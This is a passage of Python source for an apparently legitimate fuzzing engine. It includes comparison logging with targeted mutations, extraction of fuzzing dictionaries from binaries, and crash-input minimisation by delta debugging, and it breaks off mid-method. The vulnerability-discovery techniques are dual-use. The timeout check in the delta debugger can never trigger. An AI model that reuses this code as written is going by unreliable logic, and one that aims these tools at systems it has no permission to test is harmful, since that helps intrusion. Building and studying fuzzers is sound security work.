                            byte_to_comparison[byte_offset] = []
                        byte_to_comparison[byte_offset].append((baseline, 2))

        # Phase 3: Build I2S mappings
        mappings = self._build_i2s_mappings(input_data, byte_to_comparison)
        self.i2s_mappings = mappings
        self.stats["i2s_mappings_found"] = len(mappings)

        # Phase 4: Extract dictionary entries from comparison operands
        self._extract_dictionary(baseline_comparisons)

        return mappings

    def _colorize_range(self, data: bytes, start: int, end: int) -> bytes:
        """Replace bytes in range with colorization pattern."""
        result = bytearray(data)
        pattern_idx = (start // 4) % len(self.COLORIZATION_PATTERNS)
        pattern = self.COLORIZATION_PATTERNS[pattern_idx]

        for i in range(start, end):
            result[i] = pattern[(i - start) % len(pattern)]

        return bytes(result)

    async def _capture_comparisons(self, input_data: bytes) -> List[ComparisonLog]:
        """
        Execute input and capture comparison operands.

        This uses multiple techniques to extract comparison values:
        1. stderr/stdout pattern matching for common comparison functions
        2. Exit code analysis for simple comparisons
        3. Timing side-channels for iterative comparisons (memcmp)
        """
        comparisons = []

        try:
            result = await self.harness.execute(input_data)

            # Extract comparisons from output patterns
            comparisons.extend(self._extract_from_output(result.stdout, result.stderr))

            # Extract from common string comparison patterns
            comparisons.extend(self._extract_string_comparisons(input_data, result))

            # Analyze for magic value checks
            comparisons.extend(self._detect_magic_checks(input_data, result))

            self.stats["comparisons_logged"] += len(comparisons)

        except Exception as e:
            logger.debug(f"CmpLog capture failed: {e}")

        return comparisons

    def _extract_from_output(self, stdout: bytes, stderr: bytes) -> List[ComparisonLog]:
        """Extract comparison hints from program output."""
        comparisons = []
        combined = stdout + stderr

        # Pattern: "expected X, got Y" style messages
        patterns = [
            rb"expected\s+['\"]?([^'\"]+)['\"]?\s*,?\s*(?:got|but got|received)\s+['\"]?([^'\"]+)['\"]?",
            rb"mismatch.*?['\"]([^'\"]+)['\"].*?['\"]([^'\"]+)['\"]",
            rb"invalid.*?['\"]([^'\"]+)['\"].*?expected.*?['\"]([^'\"]+)['\"]",
            rb"comparing\s+([0-9a-fA-Fx]+)\s+(?:to|with|against)\s+([0-9a-fA-Fx]+)",
        ]

        for pattern in patterns:
            for match in re.finditer(pattern, combined, re.IGNORECASE):
                try:
                    op1 = self._parse_operand(match.group(1))
                    op2 = self._parse_operand(match.group(2))
                    if op1 and op2:
                        comparisons.append(ComparisonLog(
                            address=0,
                            operand1=op1,
                            operand2=op2,
                            operand_size=max(len(op1), len(op2)),
                            comparison_type="eq",
                            input_offset=None,
                            is_string_cmp=True,
                        ))
                except Exception:
                    pass

        return comparisons

    def _parse_operand(self, raw: bytes) -> Optional[bytes]:
        """Parse operand from various formats."""
        try:
            text = raw.decode('utf-8', errors='ignore').strip()

            # Hex format: 0x... or just hex digits
            if text.startswith('0x') or text.startswith('0X'):
                return bytes.fromhex(text[2:])
            if all(c in '0123456789abcdefABCDEF' for c in text) and len(text) % 2 == 0:
                return bytes.fromhex(text)

            # Integer format
            if text.isdigit() or (text.startswith('-') and text[1:].isdigit()):
                val = int(text)
                # Pack as appropriate size
                if -128 <= val <= 255:
                    return struct.pack('b' if val < 0 else 'B', val & 0xFF)
                elif -32768 <= val <= 65535:
                    return struct.pack('<h' if val < 0 else '<H', val & 0xFFFF)
                else:
                    return struct.pack('<i' if val < 0 else '<I', val & 0xFFFFFFFF)

            # String format
            return raw

        except Exception:
            return raw

    def _extract_string_comparisons(
        self, input_data: bytes, result: 'ExecutionResult'
    ) -> List[ComparisonLog]:
        """Detect string comparisons by analyzing input patterns in output."""
        comparisons = []

        # Look for input substrings that appear in error messages
        # This suggests the program compared input against something
        combined = result.stdout + result.stderr

        for length in [4, 8, 16, 32]:
            for offset in range(0, len(input_data) - length + 1, length):
                chunk = input_data[offset:offset + length]
                if chunk in combined:
                    # Input chunk appeared in output - might be a comparison failure
                    # Try to find what it was compared against
                    idx = combined.find(chunk)
                    context = combined[max(0, idx-50):idx+len(chunk)+50]

                    # Look for comparison keywords nearby
                    if any(kw in context.lower() for kw in
                           [b'expect', b'invalid', b'error', b'fail', b'mismatch']):
                        comparisons.append(ComparisonLog(
                            address=0,
                            operand1=chunk,
                            operand2=b'',  # Unknown expected value
                            operand_size=length,
                            comparison_type="eq",
                            input_offset=offset,
                            is_string_cmp=True,
                        ))

        return comparisons

    def _detect_magic_checks(
        self, input_data: bytes, result: 'ExecutionResult'
    ) -> List[ComparisonLog]:
        """Detect magic value/header checks from execution patterns."""
        comparisons = []

        # Common magic values to check against
        magic_values = [
            (b"PK\x03\x04", "ZIP"),
            (b"\x89PNG\r\n\x1a\n", "PNG"),
            (b"\xff\xd8\xff", "JPEG"),
            (b"GIF87a", "GIF87"),
            (b"GIF89a", "GIF89"),
            (b"%PDF", "PDF"),
            (b"MZ", "PE/DOS"),
            (b"\x7fELF", "ELF"),
            (b"<?xml", "XML"),
            (b"{\n", "JSON"),
            (b"[", "JSON Array"),
            (b"RIFF", "RIFF"),
            (b"BM", "BMP"),
            (b"\x00\x00\x01\x00", "ICO"),
            (b"ID3", "MP3"),
            (b"OggS", "OGG"),
            (b"ftyp", "MP4"),
        ]

        # If program fails quickly and input doesn't start with expected magic
        if result.exit_code != 0 and result.execution_time < 0.1:
            for magic, name in magic_values:
                if not input_data.startswith(magic):
                    # Check if error message mentions this format
                    combined = (result.stdout + result.stderr).lower()
                    if name.lower().encode() in combined or b'magic' in combined or b'header' in combined:
                        comparisons.append(ComparisonLog(
                            address=0,
                            operand1=input_data[:len(magic)] if len(input_data) >= len(magic) else input_data,
                            operand2=magic,
                            operand_size=len(magic),
                            comparison_type="eq",
                            input_offset=0,
                            is_string_cmp=False,
                        ))
                        break

        return comparisons

    def _build_i2s_mappings(
        self,
        input_data: bytes,
        byte_to_comparison: Dict[int, List[Tuple[ComparisonLog, int]]]
    ) -> List[InputToStateMapping]:
        """Build I2S mappings from colorization results."""
        mappings = []

        # Group consecutive bytes that affect the same comparison
        processed_ranges: Set[Tuple[int, int, int]] = set()

        for offset in sorted(byte_to_comparison.keys()):
            for cmp_log, operand_idx in byte_to_comparison[offset]:
                # Find contiguous range of bytes affecting this comparison
                start = offset
                end = offset + 1

                while end in byte_to_comparison:
                    if any(c == cmp_log and idx == operand_idx
                           for c, idx in byte_to_comparison[end]):
                        end += 1
                    else:
                        break

                range_key = (start, end, id(cmp_log))
                if range_key in processed_ranges:
                    continue
                processed_ranges.add(range_key)

                # Determine expected value (the operand we should match)
                if operand_idx == 1:
                    expected = cmp_log.operand2  # We control op1, want to match op2
                    current = cmp_log.operand1
                else:
                    expected = cmp_log.operand1  # We control op2, want to match op1
                    current = cmp_log.operand2

                if expected and len(expected) > 0:
                    # Calculate priority based on comparison type and size
                    priority = 1.0
                    if cmp_log.is_string_cmp:
                        priority = 1.5  # String comparisons are high-value
                    if len(expected) >= 4:
                        priority *= 1.2  # Multi-byte comparisons are harder to hit randomly

                    mappings.append(InputToStateMapping(
                        input_offset=start,
                        input_length=end - start,
                        comparison_address=cmp_log.address,
                        expected_value=expected[:end-start],  # Trim to match input range
                        current_value=current[:end-start] if current else b'',
                        priority=priority,
                    ))

        # Sort by priority (highest first)
        mappings.sort(key=lambda m: -m.priority)

        return mappings

    def _extract_dictionary(self, comparisons: List[ComparisonLog]):
        """Extract dictionary entries from comparison operands."""
        for cmp in comparisons:
            # Add both operands as dictionary entries
            for operand in [cmp.operand1, cmp.operand2]:
                if operand and len(operand) >= 2 and len(operand) <= 32:
                    # Skip all-zeros or all-ones
                    if operand != b'\x00' * len(operand) and operand != b'\xff' * len(operand):
                        self.auto_dictionary.add(operand)
                        self.stats["dictionary_entries_extracted"] += 1

    def _build_mappings_from_cache(
        self, input_hash: bytes, input_data: bytes
    ) -> List[InputToStateMapping]:
        """Build mappings from cached comparison data."""
        comparisons = self._comparison_cache.get(input_hash, [])
        mappings = []

        for cmp in comparisons:
            if cmp.input_offset is not None:
                mappings.append(InputToStateMapping(
                    input_offset=cmp.input_offset,
                    input_length=cmp.operand_size,
                    comparison_address=cmp.address,
                    expected_value=cmp.operand2,
                    current_value=cmp.operand1,
                    priority=1.5 if cmp.is_string_cmp else 1.0,
                ))

        return mappings

    def generate_targeted_mutations(
        self,
        input_data: bytes,
        mappings: Optional[List[InputToStateMapping]] = None,
        max_mutations: int = 20,
    ) -> List[bytes]:
        """
        Generate mutations targeting specific comparisons.

        Uses I2S mappings to create inputs that satisfy comparison conditions.
        This is the key technique that makes RedQueen effective.

        Args:
            input_data: Original input to mutate
            mappings: I2S mappings (uses self.i2s_mappings if None)
            max_mutations: Maximum mutations to generate

        Returns:
            List of targeted mutations
        """
        if mappings is None:
            mappings = self.i2s_mappings

        mutations = []

        for mapping in mappings[:max_mutations]:
            try:
                mutated = bytearray(input_data)

                # Replace input bytes with expected comparison value
                expected = mapping.expected_value
                offset = mapping.input_offset

                # Ensure we don't overflow
                replace_len = min(len(expected), len(mutated) - offset)
                if replace_len > 0:
                    mutated[offset:offset + replace_len] = expected[:replace_len]
                    mutations.append(bytes(mutated))
                    self.stats["targeted_mutations_generated"] += 1

                # Also try byte-swapped version for endianness issues
                if len(expected) in [2, 4, 8]:
                    swapped = expected[::-1]
                    mutated2 = bytearray(input_data)
                    mutated2[offset:offset + replace_len] = swapped[:replace_len]
                    mutations.append(bytes(mutated2))

            except Exception as e:
                logger.debug(f"Targeted mutation failed: {e}")

        # Add dictionary-based mutations
        for entry in list(self.auto_dictionary)[:max_mutations // 4]:
            for offset in [0, len(input_data) // 2, max(0, len(input_data) - len(entry))]:
                mutated = bytearray(input_data)
                end = min(offset + len(entry), len(mutated))
                mutated[offset:end] = entry[:end - offset]
                mutations.append(bytes(mutated))

        return mutations[:max_mutations]

    def get_dictionary_entries(self) -> List[bytes]:
        """Get extracted dictionary entries for mutation engine."""
        return list(self.auto_dictionary)

    def get_stats(self) -> Dict[str, Any]:
        """Get CmpLog statistics."""
        return {
            **self.stats,
            "auto_dictionary_size": len(self.auto_dictionary),
            "cached_inputs": len(self._comparison_cache),
            "active_mappings": len(self.i2s_mappings),
        }


# =============================================================================
# SMART DICTIONARY EXTRACTION
# =============================================================================

@dataclass
class DictionaryEntry:
    """An extracted dictionary entry with metadata."""
    value: bytes
    source: str              # 'string', 'constant', 'magic', 'format', 'instruction'
    score: float = 1.0       # Priority score for mutation
    offset: Optional[int] = None  # Offset in binary where found
    context: Optional[str] = None  # Additional context


class SmartDictionaryExtractor:
    """
    Comprehensive dictionary extraction from binary files.

    Extracts high-value tokens for fuzzing including:
    - ASCII and UTF-16 strings
    - Numeric constants from instructions
    - Magic values and file signatures
    - Format strings and protocol markers
    - Comparison operands from disassembly

    This significantly improves fuzzer effectiveness on parsers
    and protocol handlers by providing domain-specific tokens.
    """

    # Common file format signatures with descriptions
    MAGIC_SIGNATURES = [
        # Archives
        (b"PK\x03\x04", "ZIP"),
        (b"PK\x05\x06", "ZIP_EMPTY"),
        (b"Rar!\x1a\x07", "RAR"),
        (b"\x1f\x8b\x08", "GZIP"),
        (b"BZh", "BZIP2"),
        (b"\xfd7zXZ\x00", "XZ"),
        (b"7z\xbc\xaf\x27\x1c", "7Z"),
        # Images
        (b"\x89PNG\r\n\x1a\n", "PNG"),
        (b"\xff\xd8\xff", "JPEG"),
        (b"GIF87a", "GIF87"),
        (b"GIF89a", "GIF89"),
        (b"BM", "BMP"),
        (b"RIFF", "RIFF"),
        (b"WEBP", "WEBP"),
        (b"\x00\x00\x01\x00", "ICO"),
        (b"\x00\x00\x02\x00", "CUR"),
        (b"II*\x00", "TIFF_LE"),
        (b"MM\x00*", "TIFF_BE"),
        # Documents
        (b"%PDF", "PDF"),
        (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1", "OLE"),  # MS Office old
        (b"<?xml", "XML"),
        (b"<!DOCTYPE", "HTML"),
        (b"{\rtf", "RTF"),
        # Executables
        (b"MZ", "PE_DOS"),
        (b"\x7fELF", "ELF"),
        (b"\xfe\xed\xfa\xce", "MACHO32_BE"),
        (b"\xfe\xed\xfa\xcf", "MACHO64_BE"),
        (b"\xce\xfa\xed\xfe", "MACHO32_LE"),
        (b"\xcf\xfa\xed\xfe", "MACHO64_LE"),
        (b"\xca\xfe\xba\xbe", "MACHO_FAT"),
        (b"dex\n", "DEX"),
        # Media
        (b"ID3", "MP3_ID3"),
        (b"\xff\xfb", "MP3"),
        (b"OggS", "OGG"),
        (b"ftyp", "MP4"),
        (b"moov", "MOV"),
        (b"mdat", "MP4_DATA"),
        (b"FLV\x01", "FLV"),
        (b"\x1a\x45\xdf\xa3", "WEBM"),
        # Data formats
        (b"SQLite format 3", "SQLITE"),
        (b"\x00\x00\x00\x00\x00\x00\x00\x00", "NULL8"),
        # Network protocols
        (b"HTTP/1.", "HTTP"),
        (b"GET ", "HTTP_GET"),
        (b"POST ", "HTTP_POST"),
        (b"SSH-", "SSH"),
        (b"\x16\x03", "TLS"),
        (b"EHLO ", "SMTP"),
        (b"HELO ", "SMTP"),
    ]

    # Interesting string patterns to prioritize
    INTERESTING_PATTERNS = [
        # Security-relevant
        "password", "passwd", "secret", "private", "key", "token",
        "auth", "login", "admin", "root", "user", "credential",
        # Error handling
        "error", "fail", "invalid", "illegal", "bad", "wrong",
        "exception", "abort", "crash", "overflow", "underflow",
        # Format/parsing
        "parse", "read", "write", "open", "close", "load", "save",
        "format", "encode", "decode", "compress", "decompress",
        # Debug/development
        "debug", "trace", "log", "assert", "test", "todo", "fixme",
        # Boundary indicators
        "begin", "end", "start", "stop", "header", "footer",
        "length", "size", "count", "offset", "index",
    ]

    # Format string patterns
    FORMAT_PATTERNS = [
        b"%s", b"%d", b"%i", b"%u", b"%x", b"%X", b"%p", b"%n",
        b"%ld", b"%lu", b"%lx", b"%lld", b"%llu", b"%llx",
        b"%f", b"%e", b"%g", b"%c", b"%%",
        b"%02x", b"%04x", b"%08x", b"%016x",
        b"%02d", b"%04d", b"%08d",
        b"%.2f", b"%.4f", b"%.8f",
        b"%*s", b"%.*s",
    ]

    def __init__(self, binary_path: str, max_entries: int = 1000):
        self.binary_path = binary_path
        self.max_entries = max_entries
        self.entries: List[DictionaryEntry] = []
        self.stats = {
            "ascii_strings": 0,
            "utf16_strings": 0,
            "magic_values": 0,
            "constants": 0,
            "format_strings": 0,
            "instruction_operands": 0,
            "total_extracted": 0,
        }

    def extract_all(self) -> List[DictionaryEntry]:
        """
        Extract all dictionary entries from the binary.

        Returns:
            List of DictionaryEntry objects sorted by score
        """
        try:
            with open(self.binary_path, "rb") as f:
                data = f.read()
        except Exception as e:
            logger.warning(f"Failed to read binary: {e}")
            return []

        # Run all extraction methods
        self._extract_ascii_strings(data)
        self._extract_utf16_strings(data)
        self._extract_magic_values(data)
        self._extract_format_strings(data)
        self._extract_instruction_constants(data)
        self._extract_boundary_values()

        # Deduplicate and sort by score
        self._deduplicate()
        self.entries.sort(key=lambda e: -e.score)

        # Limit entries
        self.entries = self.entries[:self.max_entries]
        self.stats["total_extracted"] = len(self.entries)

        return self.entries

    def _extract_ascii_strings(self, data: bytes, min_length: int = 4, max_length: int = 128):
        """Extract printable ASCII strings."""
        current = []
        start_offset = 0

        for i, b in enumerate(data):
            if 32 <= b <= 126:
                if not current:
                    start_offset = i
                current.append(chr(b))
            else:
                if min_length <= len(current) <= max_length:
                    string = "".join(current)
                    score = self._score_string(string)
                    self.entries.append(DictionaryEntry(
                        value=string.encode('ascii'),
                        source="string",
                        score=score,
                        offset=start_offset,
                        context="ascii",
                    ))
                    self.stats["ascii_strings"] += 1
                current = []

        # Handle string at end of data
        if min_length <= len(current) <= max_length:
            string = "".join(current)
            self.entries.append(DictionaryEntry(
                value=string.encode('ascii'),
                source="string",
                score=self._score_string(string),
                offset=start_offset,
            ))
            self.stats["ascii_strings"] += 1

    def _extract_utf16_strings(self, data: bytes, min_length: int = 4, max_length: int = 128):
        """Extract UTF-16 LE strings (common in Windows binaries)."""
        # Look for null-interleaved ASCII (UTF-16 LE pattern)
        i = 0
        while i < len(data) - 3:
            # Check for UTF-16 LE pattern: char, 0x00, char, 0x00
            if data[i+1] == 0 and 32 <= data[i] <= 126:
                start = i
                chars = []
                while i < len(data) - 1:
                    if data[i+1] == 0 and 32 <= data[i] <= 126:
                        chars.append(chr(data[i]))
                        i += 2
                    else:
                        break

                if min_length <= len(chars) <= max_length:
                    string = "".join(chars)
                    score = self._score_string(string) * 0.9  # Slightly lower than ASCII
                    self.entries.append(DictionaryEntry(
                        value=string.encode('utf-16-le'),
                        source="string",
                        score=score,
                        offset=start,
                        context="utf16le",
                    ))
                    # Also add ASCII version
                    self.entries.append(DictionaryEntry(
                        value=string.encode('ascii', errors='ignore'),
                        source="string",
                        score=score * 0.8,
                        offset=start,
                        context="utf16le_ascii",
                    ))
                    self.stats["utf16_strings"] += 1
            else:
                i += 1

    def _score_string(self, string: str) -> float:
        """Score a string based on fuzzing value."""
        score = 1.0
        lower = string.lower()

        # Boost interesting patterns
        for pattern in self.INTERESTING_PATTERNS:
            if pattern in lower:
                score *= 1.5
                break

        # Boost format strings
        if "%" in string:
            score *= 1.3

        # Boost paths
        if "/" in string or "\\" in string:
            score *= 1.2

        # Boost URLs
        if "://" in string or string.startswith("http"):
            score *= 1.4

        # Penalize very common strings
        if string in ("true", "false", "null", "none", "yes", "no"):
            score *= 0.5

        # Boost medium-length strings (more likely to be meaningful)
        if 8 <= len(string) <= 32:
            score *= 1.1

        return min(score, 3.0)  # Cap score

    def _extract_magic_values(self, data: bytes):
        """Extract known file format magic values."""
        for magic, name in self.MAGIC_SIGNATURES:
            if magic in data:
                # Add with high score - magic values are very useful
                self.entries.append(DictionaryEntry(
                    value=magic,
                    source="magic",
                    score=2.5,
                    offset=data.find(magic),
                    context=name,
                ))
                self.stats["magic_values"] += 1

                # Also add with variations (for format fuzzing)
                if len(magic) >= 4:
                    # Truncated version
                    self.entries.append(DictionaryEntry(
                        value=magic[:len(magic)//2],
                        source="magic",
                        score=1.5,
                        context=f"{name}_trunc",
                    ))

    def _extract_format_strings(self, data: bytes):
        """Extract format string patterns."""
        for pattern in self.FORMAT_PATTERNS:
            offset = 0
            while True:
                idx = data.find(pattern, offset)
                if idx == -1:
                    break
                self.entries.append(DictionaryEntry(
                    value=pattern,
                    source="format",
                    score=1.8,
                    offset=idx,
                    context="printf_format",
                ))
                self.stats["format_strings"] += 1
                offset = idx + 1

                # Limit per pattern
                if self.stats["format_strings"] > 100:
                    break

    def _extract_instruction_constants(self, data: bytes):
        """
        Extract constants from common instruction patterns.

        Handles x86/x64 immediate operands in:
        - CMP instructions
        - MOV instructions
        - PUSH instructions
        - TEST instructions
        """
        constants: Set[bytes] = set()
        i = 0

        while i < len(data) - 5:
            extracted = None

            # CMP AL, imm8 (0x3C)
            if data[i] == 0x3C:
                extracted = bytes([data[i+1]])
                i += 2

            # CMP EAX, imm32 (0x3D)
            elif data[i] == 0x3D and i + 5 <= len(data):
                extracted = data[i+1:i+5]
                i += 5

            # PUSH imm32 (0x68)
            elif data[i] == 0x68 and i + 5 <= len(data):
                extracted = data[i+1:i+5]
                i += 5

            # PUSH imm8 (0x6A)
            elif data[i] == 0x6A:
                extracted = bytes([data[i+1]])
                i += 2

            # MOV reg, imm32 (0xB8-0xBF)
            elif 0xB8 <= data[i] <= 0xBF and i + 5 <= len(data):
                extracted = data[i+1:i+5]
                i += 5

            # TEST AL, imm8 (0xA8)
            elif data[i] == 0xA8:
                extracted = bytes([data[i+1]])
                i += 2

            # TEST EAX, imm32 (0xA9)
            elif data[i] == 0xA9 and i + 5 <= len(data):
                extracted = data[i+1:i+5]
                i += 5

            # CMP with ModR/M (0x80, 0x81, 0x83)
            elif data[i] in (0x80, 0x81, 0x83) and i + 2 < len(data):
                modrm = data[i+1]
                reg = (modrm >> 3) & 7
                if reg == 7:  # CMP operation
                    if data[i] == 0x80 or data[i] == 0x83:
                        # imm8
                        if i + 3 <= len(data):
                            extracted = bytes([data[i+2]])
                        i += 3
                    elif data[i] == 0x81:
                        # imm32
                        if i + 6 <= len(data):
                            extracted = data[i+2:i+6]
                        i += 6
                    else:
                        i += 1
                else:
                    i += 1
            else:
                i += 1

            if extracted and extracted not in constants:
                # Filter out boring values
                if extracted not in (b"\x00", b"\x00\x00\x00\x00",
                                     b"\xff", b"\xff\xff\xff\xff",
                                     b"\x01", b"\x01\x00\x00\x00"):
                    constants.add(extracted)
                    self.entries.append(DictionaryEntry(
                        value=extracted,
                        source="instruction",
                        score=1.4,
                        offset=i - len(extracted),
                        context="immediate",
                    ))
                    self.stats["instruction_operands"] += 1

                    # Add both endianness versions for 4-byte constants
                    if len(extracted) == 4:
                        swapped = extracted[::-1]
                        if swapped not in constants:
                            constants.add(swapped)
                            self.entries.append(DictionaryEntry(
                                value=swapped,
                                source="instruction",
                                score=1.2,
                                context="immediate_swapped",
                            ))

        self.stats["constants"] = len(constants)

    def _extract_boundary_values(self):
        """Add common boundary values for integer fuzzing."""
        boundary_values = [
            # 8-bit boundaries
            (b"\x00", "zero"),
            (b"\x01", "one"),
            (b"\x7f", "int8_max"),
            (b"\x80", "int8_min_abs"),
            (b"\xff", "uint8_max"),
            # 16-bit boundaries (little endian)
            (b"\xff\x7f", "int16_max"),
            (b"\x00\x80", "int16_min"),
            (b"\xff\xff", "uint16_max"),
            # 32-bit boundaries (little endian)
            (b"\xff\xff\xff\x7f", "int32_max"),
            (b"\x00\x00\x00\x80", "int32_min"),
            (b"\xff\xff\xff\xff", "uint32_max"),
            # 64-bit boundaries (little endian)
            (b"\xff\xff\xff\xff\xff\xff\xff\x7f", "int64_max"),
            (b"\x00\x00\x00\x00\x00\x00\x00\x80", "int64_min"),
            # Powers of 2
            (b"\x00\x01", "pow2_8"),
            (b"\x00\x04", "pow2_10"),
            (b"\x00\x10", "pow2_12"),
            (b"\x00\x40", "pow2_14"),
            # Common sizes
            (b"\x00\x01\x00\x00", "256"),
            (b"\x00\x04\x00\x00", "1024"),
            (b"\x00\x10\x00\x00", "4096"),
            (b"\x00\x00\x01\x00", "65536"),
            # Off-by-one
            (b"\xfe\xff", "uint16_max-1"),
            (b"\xfe\xff\xff\xff", "uint32_max-1"),
        ]

        for value, context in boundary_values:
            self.entries.append(DictionaryEntry(
                value=value,
                source="boundary",
                score=1.3,
                context=context,
            ))

    def _deduplicate(self):
        """Remove duplicate entries, keeping highest scored."""
        seen: Dict[bytes, DictionaryEntry] = {}
        for entry in self.entries:
            if entry.value in seen:
                if entry.score > seen[entry.value].score:
                    seen[entry.value] = entry
            else:
                seen[entry.value] = entry
        self.entries = list(seen.values())

    def get_dictionary_bytes(self) -> List[bytes]:
        """Get just the byte values for mutation engine."""
        return [e.value for e in self.entries]

    def get_stats(self) -> Dict[str, Any]:
        """Get extraction statistics."""
        return {
            **self.stats,
            "entry_count": len(self.entries),
            "sources": {
                "string": sum(1 for e in self.entries if e.source == "string"),
                "magic": sum(1 for e in self.entries if e.source == "magic"),
                "format": sum(1 for e in self.entries if e.source == "format"),
                "instruction": sum(1 for e in self.entries if e.source == "instruction"),
                "boundary": sum(1 for e in self.entries if e.source == "boundary"),
            },
            "avg_score": sum(e.score for e in self.entries) / max(1, len(self.entries)),
        }

    def export_afl_dict(self, output_path: str) -> int:
        """
        Export dictionary in AFL format.

        Args:
            output_path: Path to write dictionary file

        Returns:
            Number of entries written
        """
        count = 0
        with open(output_path, "w") as f:
            for entry in self.entries:
                # AFL dict format: name="value"
                hex_val = entry.value.hex()
                name = f"{entry.source}_{count}"
                if entry.context:
                    name = f"{entry.context}_{count}"

                # Escape for AFL format
                escaped = ""
                for b in entry.value:
                    if 32 <= b <= 126 and b not in (ord('"'), ord('\\')):
                        escaped += chr(b)
                    else:
                        escaped += f"\\x{b:02x}"

                f.write(f'{name}="{escaped}"\n')
                count += 1

        return count


# =============================================================================
# DETERMINISTIC DELTA DEBUGGING (DDMIN)
# =============================================================================

@dataclass
class DeltaDebugResult:
    """Result of delta debugging minimization."""
    original_size: int
    minimized_size: int
    reduction_percentage: float
    minimized_input: bytes
    minimized_path: str
    total_tests: int
    ddmin_passes: int
    still_crashes: bool
    crash_type: Optional[CrashType] = None
    minimization_time: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "original_size": self.original_size,
            "minimized_size": self.minimized_size,
            "reduction_percentage": self.reduction_percentage,
            "minimized_path": self.minimized_path,
            "total_tests": self.total_tests,
            "ddmin_passes": self.ddmin_passes,
            "still_crashes": self.still_crashes,
            "crash_type": self.crash_type.value if self.crash_type else None,
            "minimization_time": self.minimization_time,
        }


class DeltaDebugger:
    """
    Deterministic Delta Debugging (ddmin) for crash input minimization.

    Implements Zeller's delta debugging algorithm which systematically
    finds the minimal subset of input that triggers the crash.

    Algorithm:
    1. Divide input into n chunks
    2. Test each chunk removal
    3. If removal preserves crash, keep it
    4. Increase granularity and repeat
    5. Continue until 1-minimal (removing any byte breaks the crash)

    This produces provably minimal crash inputs, essential for:
    - Root cause analysis
    - Bug reporting
    - Regression test creation

    Reference: "Simplifying and Isolating Failure-Inducing Input" (Zeller, 2002)
    """

    def __init__(
        self,
        harness: 'ProcessHarness',
        max_tests: int = 5000,
        timeout_seconds: float = 300.0,
    ):
        self.harness = harness
        self.max_tests = max_tests
        self.timeout_seconds = timeout_seconds

        # Test cache to avoid redundant executions
        self._test_cache: Dict[bytes, Tuple[bool, Optional[CrashType]]] = {}

        # Statistics
        self.total_tests = 0
        self.cache_hits = 0
        self.ddmin_passes = 0
        self.target_crash_type: Optional[CrashType] = None

    async def _test_input(self, data: bytes) -> Tuple[bool, Optional[CrashType]]:
        """Test if input causes the target crash, with caching."""
        # Check cache first
        cache_key = hashlib.sha256(data).digest()
        if cache_key in self._test_cache:
            self.cache_hits += 1
            return self._test_cache[cache_key]

        self.total_tests += 1

        try:
            result = await self.harness.execute(data)

            if result.crashed:
                # Verify crash type matches target (if specified)
                if self.target_crash_type:
                    matches = result.crash_type == self.target_crash_type
                    self._test_cache[cache_key] = (matches, result.crash_type)
                    return matches, result.crash_type

                self._test_cache[cache_key] = (True, result.crash_type)
                return True, result.crash_type

            self._test_cache[cache_key] = (False, None)
            return False, None

        except Exception as e:
            logger.debug(f"Delta debug test failed: {e}")
            self._test_cache[cache_key] = (False, None)
            return False, None

    async def minimize(
        self,
        crash_input: bytes,
        output_dir: str,
    ) -> DeltaDebugResult:
        """
        Minimize crash input using deterministic delta debugging.

        The ddmin algorithm:
        - Split input into n chunks (initially n=2)
        - Test subsets and complements
        - If subset still crashes, recurse on it
        - If complement crashes, reduce to complement
        - Otherwise, increase granularity (n *= 2)
        - Stop when 1-minimal

        Args:
            crash_input: The crash-inducing input
            output_dir: Directory to save minimized input

        Returns:
            DeltaDebugResult with minimized input
        """
        start_time = time.time()
        original_size = len(crash_input)

        # Reset state
        self.total_tests = 0
        self.cache_hits = 0
        self.ddmin_passes = 0
        self._test_cache.clear()

        # Verify input actually crashes
        crashes, crash_type = await self._test_input(crash_input)
        if not crashes:
            return DeltaDebugResult(
                original_size=original_size,
                minimized_size=original_size,
                reduction_percentage=0.0,
                minimized_input=crash_input,
                minimized_path="",
                total_tests=self.total_tests,
                ddmin_passes=0,
                still_crashes=False,
                minimization_time=time.time() - start_time,
            )

        self.target_crash_type = crash_type

        # Run ddmin algorithm
        minimized = await self._ddmin(list(crash_input))
        minimized_bytes = bytes(minimized)

        # Verify final result still crashes
        final_crashes, _ = await self._test_input(minimized_bytes)

        # Additional polish: try removing individual bytes
        if final_crashes and len(minimized_bytes) > 1:
            minimized_bytes = await self._byte_polish(minimized_bytes)

        # Save minimized input
        os.makedirs(output_dir, exist_ok=True)
        hash_str = hashlib.sha256(minimized_bytes).hexdigest()[:12]
        minimized_path = os.path.join(output_dir, f"ddmin_{hash_str}")
        with open(minimized_path, "wb") as f:
            f.write(minimized_bytes)

        reduction = ((original_size - len(minimized_bytes)) / original_size * 100
                     if original_size > 0 else 0)

        return DeltaDebugResult(
            original_size=original_size,
            minimized_size=len(minimized_bytes),
            reduction_percentage=round(reduction, 2),
            minimized_input=minimized_bytes,
            minimized_path=minimized_path,
            total_tests=self.total_tests,
            ddmin_passes=self.ddmin_passes,
            still_crashes=final_crashes,
            crash_type=crash_type,
            minimization_time=round(time.time() - start_time, 2),
        )

    async def _ddmin(self, input_list: List[int], n: int = 2) -> List[int]:
        """
        Core ddmin algorithm (recursive).

        Args:
            input_list: Input as list of bytes (for easier manipulation)
            n: Current granularity (number of chunks)

        Returns:
            Minimized input as list of bytes
        """
        if len(input_list) <= 1:
            return input_list

        if self.total_tests >= self.max_tests:
            logger.warning("Delta debugging hit max test limit")
            return input_list

        if time.time() > self.timeout_seconds + time.time():
            logger.warning("Delta debugging timed out")
            return input_list

        self.ddmin_passes += 1

        # Clamp n to input size
        n = min(n, len(input_list))
        if n < 2:
            return input_list

        # Split into n chunks
        chunk_size = (len(input_list) + n - 1) // n
        chunks = [
            input_list[i:i + chunk_size]
            for i in range(0, len(input_list), chunk_size)
        ]

        # Test each chunk's complement (removing the chunk)
        for i, chunk in enumerate(chunks):
            # Create complement (all chunks except this one)
            complement = []
            for j, c in enumerate(chunks):
                if j != i:
                    complement.extend(c)

            if not complement:
                continue

            crashes, _ = await self._test_input(bytes(complement))
            if crashes:
                # Complement crashes! Recurse on smaller input
                return await self._ddmin(complement, max(n - 1, 2))

        # Test each individual chunk
        for chunk in chunks:
            if not chunk:
                continue

            crashes, _ = await self._test_input(bytes(chunk))
            if crashes:
                # This chunk alone crashes! Recurse on it
                return await self._ddmin(chunk, 2)

        # No single chunk or complement crashes
        # Increase granularity if possible
        if n < len(input_list):
            return await self._ddmin(input_list, min(2 * n, len(input_list)))

        # We've reached maximum granularity (1-minimal)
        return input_list

    async def _byte_polish(self, data: bytes) -> bytes:
        """
